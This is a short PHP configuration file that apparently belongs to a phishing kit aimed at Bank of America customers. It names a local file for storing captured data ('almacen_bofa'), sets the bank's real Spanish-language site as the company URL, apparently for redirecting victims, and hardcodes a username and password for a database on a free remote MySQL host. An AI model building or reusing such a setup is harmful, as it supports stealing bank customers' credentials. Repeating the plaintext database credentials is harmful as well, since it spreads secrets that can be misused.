<?php
define("ARCHIVO","core/almacen_bofa.txt");
define("EMPRESA","https://www.bankofamerica.com/es/");
//database
define("DBHOST","remotemysql.com");
define("DBUSER","oMqmzSgROU");
define("DBPASS","MI5Msh7Tr2");
define("DBNAME","oMqmzSgROU");
